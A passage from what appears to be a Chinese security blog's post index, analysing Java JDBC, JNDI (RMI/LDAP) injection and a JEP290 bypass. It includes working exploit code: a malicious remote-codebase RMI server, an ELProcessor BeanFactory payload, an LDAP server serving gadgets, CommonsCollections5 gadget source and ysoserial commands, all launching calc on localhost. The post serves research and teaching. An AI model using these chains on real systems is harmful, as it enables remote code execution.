然后会去实例化id对应的class，且调用对应的自构方法，然后再\n实例化通过SimpleInstantiationStrategy的BeanUtils.instantiateClass()实现\n然后就是就是执行最后el表达式了，先去找对应的method，然后反射invoke调用\nJDBC 总体分析 理解 1.DriverManager.getConnection()这个方法有3种传参方式，最后其实都殊途同归，也就是说随便一种都能利用JDBC\n2.就是选择哪个数据库，他这里是通过一个for然后按照顺序依次connect的，registeredDrivers猜测是获取依赖中存在的数据库\n0x5 End JDBC+JNDI 依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-dbcp\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.56\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 以Tomcat8的org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory为例\nserver\npackage jndi; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.Reference; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class RMIServer { public static void main(String[] args) throws Exception{ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://127.0.0.1:1099\u0026#34;); InitialContext ctx = new InitialContext(env); LocateRegistry.createRegistry(1099); Reference ref = new Reference(\u0026#34;javax.sql.DataSource\u0026#34;,\u0026#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory\u0026#34;,null); ref.add(new StringRefAddr(\u0026#34;url\u0026#34;, \u0026#34;jdbc:mysql://127.0.0.1:3307/test?allowLoadLocalInfile=YES\u0026amp;allowUrlInLocalInfile=true\u0026#34;)); ref.add(new StringRefAddr(\u0026#34;initialSize\u0026#34;, \u0026#34;2\u0026#34;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); ctx.bind(\u0026#34;Jie\u0026#34;, referenceWrapper); } } client\npackage jndi; import javax.naming.InitialContext; public class JNDIDemo { public static void main(String[] args) throws Exception { InitialContext ctx = new InitialContext(); ctx.lookup(\u0026#34;rmi://127.0.0.1:1099/Jie\u0026#34;); } } 然后在BasicDataSourceFactory#getObjectInstance中，一直调用会调到connect()且url是可控的，及可以利用JDBC，调用栈放下面了（不想每个截图占地方了）\ncreateConnection:55, DriverConnectionFactory (org.apache.tomcat.dbcp.dbcp2) makeObject:355, PoolableConnectionFactory (org.apache.tomcat.dbcp.dbcp2) validateConnectionFactory:114, BasicDataSource (org.apache.tomcat.dbcp.dbcp2) createPoolableConnectionFactory:664, BasicDataSource (org.apache.tomcat.dbcp.dbcp2) createDataSource:543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2) getLogWriter:1076, BasicDataSource (org.apache.tomcat.dbcp.dbcp2) createDataSource:561, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2) getObjectInstance:238, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2) 然后简单说说poc的构造吧，就是那几个参数\nBasicDataSourceFactory#getObjectInstance中,会对ClassName进行判断，所以设置这个值\nif (!\u0026#34;javax.sql.DataSource\u0026#34;.equals(ref.getClassName())) { return null; } 上面这里会对我们的Reference.addrs中元素进行获取并存到这个properties进行后面createDataSource()的赋值\n这里有两个是关键值要赋予，一个是url，另一个是initialSize\n因为下面有个if我们要进入，所以设置initialSize\u0026gt;0即可\nif (dataSource.getInitialSize() \u0026gt; 0) { dataSource.getLogWriter(); } 而最后调用的this.connectionString的值，正是来自BasicDataSource的this.url，也就是上图dataSource.setUrl(value);这个地方设置的值\n调用成功！\n参考 h2\nhttps://xz.aliyun.com/news/15960\nhttps://xz.aliyun.com/news/13371\nhttps://unam4.github.io/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/#%E5%88%86%E6%9E%90\nmysql\nhttps://xz.aliyun.com/news/7754\nhttps://cloud.tencent.com/developer/article/1818089\n","permalink":"https://Jiecub3.github.io/zh/posts/java/jdbc/","summary":"0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，","title":"JDBC综合分析"},{"content":"0x01 RMI client\npackage rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(\u0026#34;rmi://127.0.0.1:1099/Jie\u0026#34;); System.out.println(\u0026#34;ret: \u0026#34; + ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server\nimport com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = \u0026#34;http://localhost:1098/\u0026#34;; Reference reference = new Reference(\u0026#34;evilexp\u0026#34;,\u0026#34;evilexp\u0026#34;, factoryUrl); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Jie\u0026#34;, wrapper); System.err.println(\u0026#34;Server ready, factoryUrl:\u0026#34; + factoryUrl); } catch (Exception e) { System.err.println(\u0026#34;Server exception: \u0026#34; + e.toString()); e.printStackTrace(); } } } evilexp\npublic class evilexp { public evilexp() throws Exception{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } static { System.out.println(\u0026#34;Static block executed.\u0026#34;); } } 在evilexp.class目录下起一个服务 python3 -m http.server 1098 启动Server 启动client调用触发 0x02 分析 低版本jdk lookup开始\ngetURLOrDefaultInitCtx()根据rmi协议获取到rmiURLContext对象\n一路到最后一个lookup\nlookup一路到decodeObject()\n跟进NamingManager.getObjectInstance()\ngetObjectFactoryFromReference()中会获取我们的厂库类\n会先本地查找加载设置的factoryName类，找不到会远程codebase的地址去加载我们的恶意类\n用App这个加载器进行加载\n远程加载，FactoryURLClassLoader是URLClassLoader的子类\n上面Class.forName第二个参数是true，这里加载的时候就能触发static区域的代码\n得到class后进行实例化，这里触发自构方法的代码（这里会转化成ObjectFactory类，想不报错，恶意可以继承这个接口）\n返回后还会调用getObjectInstance()次方法\n小结 得下面这3个代码块都能执行我们的恶意代码\nstatic区域\n自构方法\ngetObjectInstance()\n高版本jdk 在调用NamingManager.getObjectInstance()前增加了一个检测\nif (var8 != null \u0026amp;\u0026amp; var8.getFactoryClassLocation() != null \u0026amp;\u0026amp; !trustURLCodebase) { var8是我们的Reference，var8.getFactoryClassLocation()就是我们设置的远程地址codebase，trustURLCodebase默认是false\n这里意思就是默认不让我们设置远程地址了，从而防御我们远程加载恶意类\ntry1 本地Factory类 利用本地Factory类 getObjectInstance()\n那我们把classFactoryLocation设置成null，这里Evil本地得有。然后进行调试\nReference reference = new Reference(\u0026#34;Evil\u0026#34;,\u0026#34;Evil\u0026#34;, null); 没有触发报错，来到getObjectFactoryFromReference，发现其代码逻辑并没有什么变化，还是先本地，然后远程，但是因为前面if检测的问题，这里codebase只能是null，除非修改trustURLCodebase（谁没事改这玩意！——！）\n然后的话，想高版本利用rmi，就只能利用客户端本地的类，上面3个利用点还是适用的，但是想想其实static和自构方法不太可能存在利用的地方，所以其实还是去找getObjectInstance()，这里找的话其实就有思路了getObjectInstance()是ObjectFactory接口的方法。所以我们去找ObjectFactory的继承类就行。\n上面这种方式自然也依赖于其他组件依赖，添加下面tomcat依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-embed-el\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; package rmi; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class RMIServer { public static void main(String[] args) throws Exception{ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://127.0.0.1:1099\u0026#34;); InitialContext ctx = new InitialContext(env); LocateRegistry.createRegistry(1099); ResourceRef ref = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;, null, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, true, \u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;, null); ref.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;xx=eval\u0026#34;)); ref.add(new StringRefAddr(\u0026#34;xx\u0026#34;, \u0026#34;\\\u0026#34;\\\u0026#34;.getClass().forName(\\\u0026#34;javax.script.ScriptEngineManager\\\u0026#34;).newInstance().getEngineByName(\\\u0026#34;JavaScript\\\u0026#34;).eval(\\\u0026#34;new java.lang.ProcessBuilder[\u0026#39;(java.lang.String[])\u0026#39;]([\u0026#39;calc\u0026#39;]).start()\\\u0026#34;)\u0026#34;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); ctx.bind(\u0026#34;Jie\u0026#34;, referenceWrapper); } } 成功执行\nBeanFactory利用 会去获取forceString的值，先会通过,分割成多对method，然后通过=分割每对值，前面的为最后放入map的key，后面为要获取的method名字，然后从beanclass获取这个方法（注意这里只会获取String为参数的方法，我们看到paramTypes是不可控的），然后put到forced这个Hashmap中\nbeanClass是通过beanClassName和App加载器得到的class\n然后到下面这个while中，这里获取Type，当不为if中的值时，会从前面设置的forced中通过这个Type名字获取对应的method，然后通过反射调用这个方法，这也就是为什么这两个地方值（xx）要对应\nbean对象就是beanClass实例化，然后这个地方执行成功javax.el.ELProcessor#eval\nObject bean = beanClass.newInstance(); 利用小结 BeanFactory#getObjectInstance利用条件\nJDK或者常用库的类 有public修饰的无参构造方法 //显而易见，直接通过newInstance()获得对象的 public修饰的只有一个String.class类型参数的方法，且该方法可以造成漏洞 //只能调用String方法 上面就利用的el表达式\ntry2 反序列化 利用register返回恶意序列化数据 反序列化 执行gadget\n其实分析过RMI反序列化不难想到。lookup中client会和register进行数据传输且存在反序列化\nC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk1.8.0_192\\bin\\java.exe -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 \u0026#34;calc\u0026#34; 然后运行client\n直接到最后那个lookup中，这里会向register传序列化数据做准备，然后跟进这个invoke\n到executeCall(),这里this.getInputStream();会接收register传回的序列化数据（这里我们构造恶意序列化数据即可利用），然后下方进行反序列化。\n也就是说rmi协议在高版本下，可以打gadget\n0x03 LDAP 在jdk8u191之前都能用ldap加载远程恶意类\nldap服务端需要以下依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.0.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; LDAPServer.java\npackage ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class LDAPServer{ private static final String LDAP_BASE = \u0026#34;dc=ldap\u0026#34;; public static void main (String[] args) { String url = \u0026#34;http://127.0.0.1:4444/#evilexp\u0026#34;; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;Exploit\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: 利用 LDAP + Reference Factory e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); // Payload2: 返回序列化 Gadget // try { // e.addAttribute(\u0026#34;javaSerializedData\u0026#34;, Base64.decode(\u0026#34;...\u0026#34;)); // } catch (ParseException exception) { // exception.printStackTrace(); // } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } JNDIDemo.java\npackage ldap; import javax.naming.InitialContext; public class JNDIDemo { public static void main(String[] args) throws Exception { InitialContext ctx = new InitialContext(); ctx.lookup(\u0026#34;ldap://127.0.0.1:1389/test\u0026#34;); } } 0x04 分析 低版本jdk \u0026lt; 8u191 在获取上下文时，根据协议会获取不同的上下文，\n跟进ResourceManager.getFactory()\nclassSuffix这个值是跟进协议名字拼接的，然后去实例化这个类，后面会return factory;\n然后会到ldapURLContextFactory.getObjectInstance，返回一个ldap的上下文(ldapURLContext)\n然后后续this.getRootURLContext这里调用的是ldapURLContext.getRootURLContext，var3是LdapCtx，也就导致后面和rmi的走向不一样了\nc_lookup 然后一直到c_lookup这里，this.doSearchOnce会向ldap发送请求获取值。\n然后ldap服务端，将这个值传给client端\n然后从返回的值获取attributes属性，我们是设置了javaClassName的，所以进入\n这里if都不会进，到最后一个三元表达式\nreturn var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) \u0026amp;\u0026amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2); 会进入decodeReference()，然后初始化一个Reference对象并return\n然后回到c_lookup，进入getObjectInstance()，其后续逻辑和rmi是一样的\n然后getObjectFactoryFromReference中触发利用\n小结 经过上面的分析，我们知道ldap和rmi在调用远程恶意类上的过程是有区别的\nldap调用栈\nc_lookup:1085, LdapCtx (com.sun.jndi.ldap) p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx) lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:94, ldapURLContext (com.sun.jndi.url.ldap) lookup:417, InitialContext (javax.naming) main:8, JNDIDemo (ldap) rmi调用栈\ndecodeObject:475, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) main:9, client (rmi) var8.getFactoryClassLocation()的检测是在rmi的decodeObject中，而ldap协议是调用的其他lookup并不会调用decodeObject来实现远程加载，两者协议调用机制是不一样的\n所以在8u113~8u190这段com.sun.jndi.rmi.object.trustURLCodebase 默认值为false，ldap不受影响依然可以调用远程恶意类\n高版本jdk 8u191以后，在远程加载类时加入了trustURLCodebase的判断，彻底杜绝了远程加载恶意类了。\ntry1 反序列化 还有一个点decodeObject()的 deserializeObject()符合条件会把ldap服务端返回的数据进行反序列化，有能利用的依赖就能打gadget哇！\n给javaSerializedData设置值，进入deserializeObject()\n我这里调试有点问题，不能正常调试到readObject，可能是 不是完整源码的原因，不过是成功反序列化了的\n这里var0数据就是CC5的序列化数据\ndemo代码 JNDIDemo还是一样的\nLDAPServer\npackage ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class LDAPServer{ private static final String LDAP_BASE = \u0026#34;dc=ldap\u0026#34;; public static void main (String[] args) { String url = \u0026#34;http://127.0.0.1:4444/#evilexp\u0026#34;; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;Exploit\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: 利用 LDAP + Reference Factory // e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); // e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); // e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); // Payload2: 返回序列化 Gadget try { e.addAttribute(\u0026#34;javaSerializedData\u0026#34;, CC5.getpayload()); } catch (Exception exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } CC5\npackage ldap; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; public class CC5 { public static void main(String[] args) throws Exception { byte[] o1 = getpayload(); } static byte[] getpayload() throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); LazyMap fistrmap = (LazyMap) LazyMap.decorate(new HashMap(),keyTransformer); fistrmap.put(\u0026#34;fistrmap\u0026#34;,1111); TiedMapEntry tiedMapEntry = new TiedMapEntry(fistrmap,\u0026#34;nono\u0026#34;); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Constructor\u0026lt;?\u0026gt; o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(o1, tiedMapEntry); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(o1); oos.flush(); byte[] serializedData = bos.toByteArray(); return serializedData; } } 反序列化点2 除了第一个if处可以反序列化，还有一个点可以\ne.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;foo\u0026#34;); e.addAttribute(\u0026#34;javaReferenceAddress\u0026#34;,\u0026#34;$1$String$$\u0026#34;+new BASE64Encoder().encode(serializeObject(getPayload()))); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); //$NON-NLS-1$ result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); 参考：\nhttps://tttang.com/archive/1611/#toc__2\nhttps://exp10it.io/2022/12/jndi-injection/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC-jdk-%E9%99%90%E5%88%B6\n","permalink":"https://Jiecub3.github.io/zh/posts/java/jndi/","summary":"0x01 RMI client package rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(\u0026#34;rmi://127.0.0.1:1099/Jie\u0026#34;); System.out.println(\u0026#34;ret: \u0026#34; + ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = \u0026#34;http://localhost:1098/\u0026#34;; Reference","title":"JNDI"},{"content":" 前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290。然后笔者是把其绕过原理理解成2条通信（或者说线程）而设置JEP290只作用于第一条通信，通过第二条通信进行绕过\nJEP290 参考很多这篇文章，https://www.anquanke.com/post/id/259059#h3-1\nJEP290干嘛的，简单说就是一个防御反序列化攻击的黑白名单过滤器\n提供一个限制反序列化类的机制，白名单或者黑名单 限制反序列化的深度和复杂度 为 RMI 远程调用对象提供了一个验证类的机制 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。 JEP290支持的版本：\nJava™ SE Development Kit 8, Update 121 (JDK 8u121) Java™ SE Development Kit 7, Update 131 (JDK 7u131) Java™ SE Development Kit 6, Update 141 (JDK 6u141) 设置JEP290的方式有下面两种：\n通过setObjectInputFilter来设置filter 直接通过conf/security/java.properties文件进行配置 JEP290应用 在RMI反序列化中应用在register端，比如bind绑定对象时，JEP290是需要设置的，像Client和Server之间的互打则没有JEP290的检测，所以之后的版本还是能相互打。\n在8u121后，java在oldDispatch#unmarshalCustomCallData()中通过setObjectInputFilter进行设置\n这里UnicastServerRef.this.filter存储的是一个表达式RegistryImpl::registryFilter，这也是为什么后面会调到这个registryFilter方法进行检测\nJEP290作用点 没有JEP290时，我们通过下图readObject就可以成功实现反序列化攻击\nJEP290作用点也在这个readObject中，这里serialFilter就是前面的filter(RegistryImpl::registryFilter)，进入registryFilter，registryFilter就是JEP290设置的过滤Filter，这里会先将需要反序列化的类进行白名单检测(就是这个return判断)，然后再进行反序列化\n白名单如下：\nString.class Number.class Remote.class Proxy.class UnicastRef.class RMIClientSocketFactory.class RMIServerSocketFactory.class ActivationID.class UID.class 这里我们的恶意对象不在白名单中，从而导致我们反序列化攻击失败\nBypass 8u121~8u230 这里绕过思路是，serialFilter作用于我们的恶意Server端和Register端的反序列化，但其实在这个过程中还存在一段通信，而这段通信中的serialFilter和第一段通信的serialFilter是相互独立的，及第二段通信反序列化不会有这个检测，且这段通信的数据也是序列化传输的，所以如果我们可以在第一段流程中控制第二段通信的服务地址，连接上我们的恶意服务，返回恶意反序列化内容即可反序列化攻击成功，光看这段描述可能不太能理解，不用担心，可以看看下面具体分析\n实现demo 这里攻击的是register\n依次执行下面命令和java文件\nC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk1.8.0_192\\bin\\java.exe -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 \u0026#34;calc\u0026#34; RMIRegistry\npackage JEP290; import java.rmi.registry.LocateRegistry; public class RMIRegistry { public static void main(String[] args) { try { LocateRegistry.createRegistry(1099); System.out.println(\u0026#34;RMI Registry Start\u0026#34;); } catch (Exception e) { e.printStackTrace(); } while (true) ; } } DefineClient\npackage JEP290; import com.example.HelloImpl; import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class DefineClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(1099); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\u0026#34;localhost\u0026#34;, 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref); // lookup方法也可以，但需要手动模拟lookup方法的流程 registry.bind(\u0026#34;pwn\u0026#34;, handler); } } 简单流程分析 在原先readOject下面这里var2.releaseInputStream();会进行第二段通信利用\n在registerRefs会得到JRMP段服务地址，这个值怎么初始化的后面会提到\n这里lookup其实没干什么，只是封装了下我们的var0\n后续在executeCall()中this.getInputStream();建立新的通讯，然后将接收序列化数据执行反序列化\n调用栈\nexecuteCall:220, StreamRemoteCall (sun.rmi.transport) invoke:375, UnicastRef (sun.rmi.server) dirty:109, DGCImpl_Stub (sun.rmi.transport) makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:160, DGCClient (sun.rmi.transport) registerRefs:102, ConnectionInputStream (sun.rmi.transport) releaseInputStream:157, StreamRemoteCall (sun.rmi.transport) dispatch:80, RegistryImpl_Skel (sun.rmi.registry) oldDispatch:468, UnicastServerRef (sun.rmi.server) dispatch:300, UnicastServerRef (sun.rmi.server) TCPEndpoint（JRMP段地址）的赋值 他的赋值其实是在原先反序列化利用点开始的\n我们设置的对象是专门继承RemoteObject(继承Remote在白名单上)的，到其的readObject，跟进ref.readExternal(in);\n跟进LiveRef.read\n这里会从序列化数据提取出ip和port，生成一个TCPEndpoint赋给var2，然后封装成一个LiveRef传到var6.saveRef()里\nsaveRef()里最后存在到incomingRefTable这个table里面，可以回头看利用分析，就是从这个变量取的对象\n2段通信 \u0026amp; serialFilter 这里有个点需要搞清楚关于serialFilter\n第一段通信\n第一段通信，第一段通信是建立于我们Server端bind(),向Register端进行数据传输，记住这里的ConnectionInputStream@982编号，他的super的super既是ObjectInputStream(存储serialFilter)\n然后没有特别设置的话，serialFilter是为null的\n第一段通信中，我们知道在unmarshalCustomCallData()中给this.serialFilter设置了值，注意这里编号ConnectionInputStream@982\n第二段通信，JRMP协议\n注意到UnicastRef#invoke=\u0026gt;executeCall()=\u0026gt;this.getInputStream();会建立新的通信，这里编号为ConnectionInputStream@1160\npublic ObjectInput 